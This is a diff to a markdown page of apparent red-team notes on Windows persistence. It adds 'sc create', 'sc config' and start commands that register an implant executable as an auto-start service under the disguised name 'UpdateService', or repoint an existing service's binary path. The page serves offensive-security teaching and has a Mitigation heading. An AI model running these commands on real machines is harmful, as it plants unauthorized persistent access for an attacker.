@@ -1,9 +1,23 @@
-# Service Creation
+# Service Creation/Modification
 
-With Admin access we can create a new service to run our payload at start up or modify existing service and replace the binary/path to do the same.
+#### With Admin access we can create a new service to run our payload at start up or modify existing service and replace the binary/path to do the same.
+
+## <mark style="color:red;">Create a New Service</mark>
 
 ```
-C:\> sc create evilsvc binpath= "c:\payload.exe" start= "auto" obj= "LocalSystem" password= ""
+sc create UpdateService binpath= c:\rto\pers\implant\implantsrv.exe start= auto
+sc query UpdateService
+sc start UpdateService
+```
+
+## <mark style="color:red;">Modify Existing service</mark>
+
+change the binary path
+
+```
+sc config UpdateService binpath= "c:\windows\system32\notepad.exe"
+sc stop UpdateService
+sc start UpdateService
 ```
 
 ## <mark style="color:red;">Mitigation</mark>
